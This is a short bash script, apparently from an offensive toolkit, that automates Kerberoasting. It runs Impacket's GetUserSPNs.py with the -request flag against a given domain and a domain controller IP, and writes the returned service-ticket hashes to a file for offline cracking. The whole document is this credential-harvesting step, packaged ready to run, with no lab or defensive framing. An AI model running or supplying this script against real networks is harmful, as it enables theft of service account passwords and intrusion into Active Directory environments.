#!/bin/bash
# enum_kerberos.sh - Enumerate Kerberos
DOMAIN=\$1
OUTPUT_DIR="../\${DOMAIN}"
mkdir -p \$OUTPUT_DIR
GetUserSPNs.py -request \$DOMAIN/ -dc-ip 192.168.1.1 > \$OUTPUT_DIR/kerberos_spns.txt
